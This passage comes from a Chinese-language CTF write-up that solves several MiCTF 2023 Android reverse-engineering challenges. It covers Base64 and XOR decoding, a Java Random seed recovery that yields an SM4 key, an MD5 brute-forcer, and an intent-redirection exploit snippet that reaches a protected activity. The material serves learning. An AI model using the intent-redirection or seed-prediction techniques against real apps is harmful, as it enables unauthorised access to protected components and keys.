<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>fun chi(x: Char): Int {
</span></span><span style="display:block;padding:0 1.25rem">    return legalChars.indexOf(x)
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun decode(str: String): String {
</span><span style="display:block;padding:0 1.25rem">    val result = ArrayList&lt;Byte&gt;()
</span><span style="display:block;padding:0 1.25rem">    var i = 0
</span><span style="display:block;padding:0 1.25rem">    while (i &lt; str.length) {
</span><span style="display:block;padding:0 1.25rem">        // 最后的等号
</span><span style="display:block;padding:0 1.25rem">        if (str[i + 2] == &#x27;=&#x27;) {
</span><span style="display:block;padding:0 1.25rem">            val x = (chi(str[i]) shl 18) or (chi(str[i + 1]) shl 12)
</span><span style="display:block;padding:0 1.25rem">            result.add((x shr 16 and 255).toByte())
</span><span style="display:block;padding:0 1.25rem">        } else if (str[i + 3] == &#x27;=&#x27;) {
</span><span style="display:block;padding:0 1.25rem">            val x = (chi(str[i]) shl 18) or (chi(str[i + 1]) shl 12) or (chi(str[i + 2]) shl 6)
</span><span style="display:block;padding:0 1.25rem">            result.add((x shr 16 and 255).toByte())
</span><span style="display:block;padding:0 1.25rem">            result.add((x shr 8 and 255).toByte())
</span><span style="display:block;padding:0 1.25rem">        } else {
</span><span style="display:block;padding:0 1.25rem">            val x = (chi(str[i]) shl 18) or (chi(str[i + 1]) shl 12) or (chi(str[i + 2]) shl 6) or chi(str[i + 3])
</span><span style="display:block;padding:0 1.25rem">            result.add((x shr 16 and 255).toByte())
</span><span style="display:block;padding:0 1.25rem">            result.add((x shr 8 and 255).toByte())
</span><span style="display:block;padding:0 1.25rem">            result.add((x and 255).toByte())
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">        i += 4
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    return result.toByteArray().decodeToString()
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">调用decode，解密字符串，拿到flag</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2023.android_1;
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">public class Main {
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">    public static void main(String[] args) {
</span><span style="display:block;padding:0 1.25rem">        String target = &quot;DgGXC18XC19cytvLnJq=&quot;;
</span><span style="display:block;padding:0 1.25rem">        String origin = Base64Kt.decode(target);
</span><span style="display:block;padding:0 1.25rem">        System.out.println(origin);
</span><span style="display:block;padding:0 1.25rem">        System.out.println(Base64Kt.encode(origin.getBytes()));
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="mobile-2-xor" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#mobile-2-xor">#</a>mobile-2 xor</h3>
<p class="my-4 leading-7">入口文件，将一个20位的字符串flag{xxxxxxxxxxxxxx}中间部分扔到一个so文件处理。</p>
<p class="my-4 leading-7"><img alt="APP入口" src="/static/image/mobile-2-1.19b8843e.png"/></p>
<p class="my-4 leading-7">把so文件扔到IDA里，按F5反编译成源码。</p>
<p class="my-4 leading-7"><img alt="IDA反编译so" src="/static/image/mobile-2-2.154d6351.png"/></p>
<p class="my-4 leading-7">对C语言不是很了解，大概能看懂，写了个解码程序。</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2023.android_2
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun toLH(n: Int): ByteArray {
</span><span style="display:block;padding:0 1.25rem">    val b = ByteArray(4)
</span><span style="display:block;padding:0 1.25rem">    b[0] = (n and 0xff).toByte()
</span><span style="display:block;padding:0 1.25rem">    b[1] = (n shr 8 and 0xff).toByte()
</span><span style="display:block;padding:0 1.25rem">    b[2] = (n shr 16 and 0xff).toByte()
</span><span style="display:block;padding:0 1.25rem">    b[3] = (n shr 24 and 0xff).toByte()
</span><span style="display:block;padding:0 1.25rem">    return b
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun main() {
</span><span style="display:block;padding:0 1.25rem">    val str = &quot;Hello_from_C++&quot;
</span><span style="display:block;padding:0 1.25rem">    val num1 = 251658271
</span><span style="display:block;padding:0 1.25rem">    val num2 = 1073951232
</span><span style="display:block;padding:0 1.25rem">    val num3 = 387712034
</span><span style="display:block;padding:0 1.25rem">    val bytes = toLH(num1) + toLH(num2) + toLH(num3) + byteArrayOf(&#x27;m&#x27;.toByte(), &#x27;\n&#x27;.toByte())
</span><span style="display:block;padding:0 1.25rem">    val sb = StringBuilder()
</span><span style="display:block;padding:0 1.25rem">    for (i in 0 until 14) {
</span><span style="display:block;padding:0 1.25rem">        sb.append((bytes[i].toInt() xor str[i].toInt()).toChar())
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    println(&quot;flag{$sb}&quot;)
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">最后两位m和\n是猜出来的，有没有大佬帮忙解释一下为什么v8会覆盖到v7的后面？</p>
<h3 id="mobile-3-maze" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#mobile-3-maze">#</a>mobile-3 MAZE</h3>
<p class="my-4 leading-7">想起了上一届的题目，不过这次用android写的，幸运的是没用so。。。</p>
<p class="my-4 leading-7">源码含义是题目给了一个地图，走24步从@走到#号，adsw分别代表左右下上，最后行走的路径就是flag。拆了一下代码，大概能看出个样子。</p>
<p class="my-4 leading-7"><img alt="maze_map" src="/static/image/mobile-3-1.4880d387.png"/></p>
<h3 id="mobile-4-重定向初探" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#mobile-4-重定向初探">#</a>mobile-4 重定向初探</h3>
<p class="my-4 leading-7">理论上自己构造一个intent，然后把exp的intent指向flag activity。</p>
<p class="my-4 leading-7"><img alt="APP onCreate" src="/static/image/mobile-4-1.9702debf.png"/></p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>fun test() {
</span></span><span style="display:block;padding:0 1.25rem">    binding.testButton.setOnClickListener {
</span><span style="display:block;padding:0 1.25rem">        val intent = Intent(&quot;ACTION_SHARE_TO_ME&quot;)
</span><span style="display:block;padding:0 1.25rem">        intent.component = ComponentName(&quot;com.mictf.intent0&quot;, &quot;com.mictf.intent0.MainActivity&quot;)
</span><span style="display:block;padding:0 1.25rem">    
</span><span style="display:block;padding:0 1.25rem">        val next = Intent()
</span><span style="display:block;padding:0 1.25rem">        next.setClassName(&quot;com.mictf.intent0&quot;, &quot;com.mictf.intent0.flag&quot;)
</span><span style="display:block;padding:0 1.25rem">    
</span><span style="display:block;padding:0 1.25rem">        intent.putExtra(&quot;exp&quot;, next)
</span><span style="display:block;padding:0 1.25rem">        startActivity(intent)
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7"><del>但是action的判断和intent-filter里的值不一样，导致intent无法传达。。。</del></p>
<p class="my-4 leading-7">最终猜测了一个flag出来。。。</p>
<h3 id="mobile-5-数学家" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#mobile-5-数学家">#</a>mobile-5 数学家</h3>
<p class="my-4 leading-7">apk反编译一下，发现是个SM4算法。搜索了一下，有个SM4中的DFA（侧信道攻击）的方法。但是感觉不太对。</p>
<p class="my-4 leading-7">注释里提到了r1和r2的值，让你求解r3和r4。后来终于明白了注释里的r1，r2代表的是什么意思，这四个数字是随机数生成的，我们都知道计算机生成随机数是一种伪随机数，知道了种子就能预测下次的生成结果。正好这里知道了两个随机数，可以遍历求解下次和下下次的随机数种子了。</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2023.android_5
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">val r1 = 0x5B43251CL
</span><span style="display:block;padding:0 1.25rem">val r2 = 0x3FE052A6L
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun liner(seed: Long): Long {
</span><span style="display:block;padding:0 1.25rem">    return ((seed * 25214903917 + 11) and 0xffffffffffff)
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun getNext(v1: Long, v2: Long): Long {
</span><span style="display:block;padding:0 1.25rem">    for (i in 0..65535) {
</span><span style="display:block;padding:0 1.25rem">        val seed = (v1 * 65536 + i).toLong()
</span><span style="display:block;padding:0 1.25rem">        if ((liner(seed) shr 16) == v2) {
</span><span style="display:block;padding:0 1.25rem">            println(&quot;seed ${seed}&quot;)
</span><span style="display:block;padding:0 1.25rem">            return (liner(liner(seed)) shr 16)
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    return 0
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun main() {
</span><span style="display:block;padding:0 1.25rem">    val r3 = getNext(r1, r2)
</span><span style="display:block;padding:0 1.25rem">    val r4 = getNext(r2, r3)
</span><span style="display:block;padding:0 1.25rem">    println(&quot;${r1},${r2},${r3},${r4}&quot;)
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">知道了四个随机数，代入到SM4进行解密。</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>fun main() {
</span></span><span style="display:block;padding:0 1.25rem">    val nextInt: Int = 0x5B43251C
</span><span style="display:block;padding:0 1.25rem">    val nextInt2: Int = 0x3FE052A6
</span><span style="display:block;padding:0 1.25rem">    val nextInt3: Int = 3987903328.toInt()
</span><span style="display:block;padding:0 1.25rem">    val nextInt4: Int = 1834396842
</span><span style="display:block;padding:0 1.25rem">//    Log.e(&quot;Tips&quot;, &quot;r1 = 0x5B43251C&quot;)
</span><span style="display:block;padding:0 1.25rem">//    Log.e(&quot;Tips&quot;, &quot;r2 = 0x3FE052A6&quot;)
</span><span style="display:block;padding:0 1.25rem">//    Log.e(&quot;Tips&quot;, &quot;Can you find r3 and r4 ?&quot;)
</span><span style="display:block;padding:0 1.25rem">    val res = Encryption.deal(
</span><span style="display:block;padding:0 1.25rem">        &quot;64E17A9C1A7A396E479BD78BEE46FBAA&quot;,
</span><span style="display:block;padding:0 1.25rem">        0,
</span><span style="display:block;padding:0 1.25rem">        Encryption.hexStringToBytes(
</span><span style="display:block;padding:0 1.25rem">            String.format(&quot;%08X&quot;, nextInt) + String.format(
</span><span style="display:block;padding:0 1.25rem">                &quot;%08X&quot;,
</span><span style="display:block;padding:0 1.25rem">                nextInt2
</span><span style="display:block;padding:0 1.25rem">            ) + String.format(&quot;%08X&quot;, nextInt3) + String.format(&quot;%08X&quot;, nextInt4)
</span><span style="display:block;padding:0 1.25rem">        )
</span><span style="display:block;padding:0 1.25rem">    )
</span><span style="display:block;padding:0 1.25rem">    println(res)
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">// 736D345F346E645F72406E64306D2121</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">得到的结果十六进制解码一下即可得到flag。</p>
<h3 id="mobile-6-多少个md5" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#mobile-6-多少个md5">#</a>mobile-6 多少个MD5</h3>
<p class="my-4 leading-7">这个题是so文件的逆向分析。逆向不是强项，只能连蒙带猜的做。</p>
<p class="my-4 leading-7">把apk反编译一下，找到入口。</p>
<div class="language-java"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-java" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>private static final void onCreate$lambda$0(Editable var0, MainActivity var1, View var2) {
</span></span><span style="display:block;padding:0 1.25rem">      Intrinsics.checkNotNullParameter(var1, &quot;this$0&quot;);
</span><span style="display:block;padding:0 1.25rem">      if (StringsKt.startsWith$default(var0.toString(), &quot;flag{&quot;, false, 2, (Object)null) &amp;&amp; StringsKt.endsWith$default(var0.toString(), &quot;}&quot;, false, 2, (Object)null) &amp;&amp; var0.length() == 25) {
</span><span style="display:block;padding:0 1.25rem">         String var3 = var0.toString().substring(5, var0.length() - 1);
</span><span style="display:block;padding:0 1.25rem">         Intrinsics.checkNotNullExpressionValue(var3, &quot;this as java.lang.String…ing(startIndex, endIndex)&quot;);
</span><span style="display:block;padding:0 1.25rem">         if (var1.stringFromJNI(var3)) {
</span><span style="display:block;padding:0 1.25rem">            Toast.makeText((Context)var1, (CharSequence)&quot;flag正确！&quot;, 0).show();
</span><span style="display:block;padding:0 1.25rem">         } else {
</span><span style="display:block;padding:0 1.25rem">            Toast.makeText((Context)var1, (CharSequence)&quot;flag错误！&quot;, 0).show();
</span><span style="display:block;padding:0 1.25rem">         }
</span><span style="display:block;padding:0 1.25rem">      } else {
</span><span style="display:block;padding:0 1.25rem">         Toast.makeText((Context)var1, (CharSequence)&quot;flag格式错误！&quot;, 0).show();
</span><span style="display:block;padding:0 1.25rem">      }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">   }</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">这段代码判断输入字符串的格式为flag{xxxxxxxx}，长度25位，并将其中的19位传个so文件进行判断。重点看一下so文件的函数的逻辑。</p>
<p class="my-4 leading-7">把so文件扔IDA pro里，找到入口 <code>Java_com_crl_native1_MainActivity_stringFromJNI</code> ，大体看一下程序结构。</p>
<p class="my-4 leading-7">开始声明了4个字符串，看样子是MD5。通过在线md5反查可以把前三个解出来。</p>
<p class="my-4 leading-7"><img alt="md5" src="/static/image/mobile-6-1.b8cd1071.png"/></p>
<p class="my-4 leading-7">前三个每个都是一个4位的字符串，猜测一下最后一个也是一个4位的字符串生成的。但是在线md5解不出来。继续看后面的逻辑。</p>
<p class="my-4 leading-7"><img alt="计算逻辑" src="/static/image/mobile-6-2.db2c4ea1.png"/></p>
<p class="my-4 leading-7">这一部分对字符串每4位求一次md5，与上面的md5进行比较。最后4位连续求了两次md5，所以才查不出来。写个程序爆破一下。</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2023.android_4
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">import org.apache.commons.codec.digest.DigestUtils
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun md5(str: String): String {
</span><span style="display:block;padding:0 1.25rem">    return DigestUtils.md5Hex(str)
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">val md5str = &quot;95bc7a9681dc650bb0531110bdcbd65d&quot;
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun crack() {
</span><span style="display:block;padding:0 1.25rem">    val str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ?.,|\\/~!@#$%^&amp;*()-_=+?{}[]` ;:&#x27;\&quot;&quot;
</span><span style="display:block;padding:0 1.25rem">    for (ch1 in str) {
</span><span style="display:block;padding:0 1.25rem">        for (ch2 in str) {
</span><span style="display:block;padding:0 1.25rem">            for (ch3 in str) {
</span><span style="display:block;padding:0 1.25rem">                for (ch4 in str) {
</span><span style="display:block;padding:0 1.25rem">                    val x = ch1.toString() + ch2 + ch3 + ch4
</span><span style="display:block;padding:0 1.25rem">                    if (md5(md5(x)) == md5str) {
</span><span style="display:block;padding:0 1.25rem">                        println(x)
</span><span style="display:block;padding:0 1.25rem">                        return
</span><span style="display:block;padding:0 1.25rem">                    }
</span><span style="display:block;padding:0 1.25rem">                }
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    println(&quot;notfound&quot;)
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun main() {
</span><span style="display:block;padding:0 1.25rem">    println(md5(&quot;xiao&quot;))
</span><span style="display:block;padding:0 1.25rem">    println(md5(&quot;mi1I&quot;))
</span><span style="display:block;padding:0 1.25rem">    println(md5(&quot;2023&quot;))
</span><span style="display:block;padding:0 1.25rem">    println(md5(md5(&quot;ctf!&quot;)))
</span><span style="display:block;padding:0 1.25rem">//    crack()
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">最终把所有md5的原值找出来之后，拼接成字符串，提交，居然不对。。。难道漏掉了什么？？？</p>
<p class="my-4 leading-7">======================卡了好久的分割线=====================</p>
<p class="my-4 leading-7">又仔细看了一下，入参是19位字符串，而现在只有16位，还有三位被处理没了。</p>
